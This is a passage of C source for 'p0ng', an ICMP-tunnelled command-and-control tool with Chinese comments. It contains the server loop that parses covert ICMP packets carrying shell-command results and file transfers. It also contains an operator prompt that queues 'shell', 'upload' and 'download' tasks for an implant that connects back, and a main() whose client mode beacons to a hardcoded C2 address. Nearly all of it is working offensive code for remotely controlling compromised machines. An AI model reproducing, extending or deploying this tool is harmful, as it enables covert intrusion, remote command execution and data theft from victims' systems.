    struct protoent *protocol;
    uint8_t iphdr_len = 0;
    uint8_t icmptotal_len = 0;
    uint8_t recvpacket[IPHDR_DEFAULT_LEN+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_LEN];
    struct ip *st_ip;
    uint8_t ip_src[20]={0},ip_dst[20]={0};
    uint8_t pkt_type=0;    
    uint8_t pkt_size=0;    
    uint32_t icmp_buf_size = 50 * 1024;
    
    if ((protocol = getprotobyname("icmp")) == NULL)
    {
        perror("getprotobyname error");
        exit(1);
    }

    if ((sockfd = socket(AF_INET, SOCK_RAW, protocol->p_proto)) < 0)
    {
        perror("socket error");
        exit(1);
    }
    setuid(getuid());
    setsockopt(sockfd, SOL_SOCKET, SO_RCVBUF, &icmp_buf_size, sizeof(icmp_buf_size));
    pid = getpid();
    
    while(1){
        pkt_size = recv(sockfd, recvpacket, sizeof(recvpacket), 0);
        st_ip = (struct ip *) recvpacket;
        strcpy(ip_src,inet_ntoa(st_ip->ip_src));
        strcpy(ip_dst,inet_ntoa(st_ip->ip_dst));
        if(verbose||debug) printf("\r\033[K\033[40;34m[@]\033[0m %s --> %s %dbytes\n", ip_src, ip_dst, pkt_size);
        iphdr_len = st_ip->ip_hl << 2;
        icmptotal_len = pkt_size - iphdr_len;
        if( icmptotal_len < 8){
            printf("\033[40;31m[-]\033[0mMalformed Message!\n");
            continue;
        }
        else
            pkt_type=recvpacket[iphdr_len+ICMPHDR_LEN+ICMP_TIMESTAMP_LEN+ICMP_DATA_PRESERVE];
        switch(pkt_type)
        {
            case ICMP_TASK_QUERY://处理客户端发来的任务请求，返回当前任务信息
                if(verbose||debug) printf("\r\033[KEntering @current_task_responcer@\n");
                current_task_responcer(recvpacket, pkt_size);//basic icmp-pktcheck
                break;
            case ICMP_SHELLCMD_RESULT://处理客户端发来的shell命令执行结果。
                if(verbose||debug) printf("\r\033[KEntering @show_execute_result@\n");
                show_execute_result(recvpacket, pkt_size); 
                break;
            case ICMP_UPLOAD_RESULT://处理客户端发来的文件上传数据。
                if(verbose||debug) printf("\r\033[KEntering @upload_responcer@\n");
                show_upload_result(recvpacket, pkt_size); 
                break;
            case ICMP_DOWNLOAD_QUERY://处理客户端发来的文件下载请求，并返回文件数据。
                if(verbose||debug) printf("\r\033[KEntering @download_responcer@\n");
                show_download_result(recvpacket, pkt_size); 
                break;
            //@todo delete such case later
            case ICMP_SHELLCMD:
            case ICMP_UPLOAD:
            case ICMP_DOWNLOAD:
                printf("\r\033[K\033[40;31m[-]\033[0mOooops.Received wrong type packet\n");
            default://处理正常的ICMP报文及其他情况。按照正常的ICMP响应来构造。
                if(verbose||debug) printf("\r\033[KEntering @regular_responcer@\n");
                regular_responcer(recvpacket, pkt_size);
                
        }
        reset_current_work();
		//@todo 支持更新被控端的状态，会话是否已经老化死亡。

    } 
}

void p0ng_c2_main(){
    char p0ngcmd[100];
    int status=0;
    pthread_t socket_thread;
    char ch;
    print_logo();
    //创建socket线程处理客户端回连过来的ICMP流。
    pthread_create(&socket_thread,NULL,p0ng_server,NULL);
    //pthread_join(socket_thread,NULL); //该函数用于阻塞等待线程结束
    while(1){
        printf("\033[40;32mp0ng$>\033[0m");
        memset(p0ngcmd,0,100);        
        fgets(p0ngcmd,ICMP_DATA_LEN-ICMP_DATA_PRESERVE,stdin);//fgets会存储换行符
        setbuf(stdin,NULL);//@todo 想处理输入过长字符串导致的缓冲区残留问题，但是发现好像不起作用。
        //p0ngcmd[sizeof(p0ngcmd)-1]='\0';//如果后期更改了ICMP_DATA_LEN，这里可以做溢出保护。

        //注意下面是根据输入设置当前的任务信息，存储在current_work中。client获取current_work后，server会重置当前任务。
        if(strncmp(p0ngcmd,"shell ",6) == 0){
            set_current_work(ICMP_SHELLCMD, p0ngcmd+6, strlen(p0ngcmd+6));
        } else if (strncmp(p0ngcmd,"upload ",7) == 0){
            set_current_work(ICMP_UPLOAD, p0ngcmd+7, strlen(p0ngcmd+7));
        } else if (strncmp(p0ngcmd,"download ",9) == 0){
            set_current_work(ICMP_DOWNLOAD, p0ngcmd+9, strlen(p0ngcmd+9));
        } else if ((strcmp(p0ngcmd,"help\n") == 0)){
            print_usage();
        } else if (strcmp(p0ngcmd,"\n") ==0){
            continue;
        } else if(strcmp(p0ngcmd,"reset\n") ==0) {
            reset_current_work();
        } else {
            printf("\033[40;33m[!]\033[0munknow command! %3s..\n",p0ngcmd);
        }
        //@todo show log message,记录会话及current_work内的信息。
        //@todo 支持显示被控端的状态。(会话是否还在。)
    }
}

int main(int argc, char *argv[]){
    //p0ng-reverse
    //server: p0ng -S
    //client: p0ng -C -s server_addr

    int32_t opt=0;
    uint8_t server_ip[16]="192.168.199.202";
    uint8_t btn_s=0;
    uint8_t btn_c=0;
    srand(time(0));
    while((opt=getopt(argc,argv,"SChqs:"))!=-1)
    {
        switch(opt)
        {
            case 'h':
                printf("-C client-mode\n");
                printf("-S Server-mode\n");
                printf("-s [IP] configure c2-server address\n");
                printf("-h show usage\n");
                exit(0);
            case 'q':
                debug=0;
                verbose=0;
                break;
            case 'C':
                btn_s=0;
                btn_c=1;
                break;
            case 's':
                strcpy(server_ip,optarg);
                break;
            case 'S':
            default:
                btn_s=1;
                btn_c=0;
                
        }
    }
    if((btn_s^btn_c)==0){
        exit(1);
    }
    if(btn_s){
        p0ng_c2_main();
    }
    if(btn_c){
        printf("[+]Connecting...");
        p0ng_client(server_ip);
    }

    return 0;
}
